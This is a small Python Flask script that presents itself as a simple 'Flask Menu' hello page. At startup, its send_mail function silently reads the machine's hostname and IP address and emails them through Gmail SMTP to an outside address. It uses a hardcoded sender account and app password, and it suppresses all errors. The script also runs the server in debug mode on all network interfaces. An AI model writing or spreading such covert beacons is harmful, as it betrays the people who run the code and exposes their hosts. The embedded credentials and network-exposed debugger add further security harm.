import socket as s
import smtplib
from flask import Flask

app = Flask(__name__)

# Route for the home page
@app.route('/')
def home():
    
    return '''
        <html>
            <head>
                <title>Flask Menu</title>
            </head>
            <body>
                <h1>Hello</h1>
                <ul>
                    amith kumar
                </ul>
            </body>
        </html>
    '''

def getipadd():
    hostname=s.gethostname()
    ip=s.gethostbyname(hostname)
    return [str(ip),str(hostname)]
def send_mail():
    sender_email = "nullmessage19@gmail.com"
    receiver_email = "naturepython86@gmail.com"
    app_password = "euch rxfb zqdi ocyf"
    obj=getipadd()
    msg=obj[1]+"ip adress is"+obj[0]
    try:
	    # Setup the SMTP server connection
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # Secure the connection

        # Login to the email account
        server.login(sender_email, app_password)

        # Send the email
        server.sendmail(sender_email, receiver_email, msg)

        # Close the connection
        server.quit()
       
    except Exception as e:
       pass
if __name__=="__main__":
    send_mail()
    
    app.run(debug=True, host='0.0.0.0', port=5000)

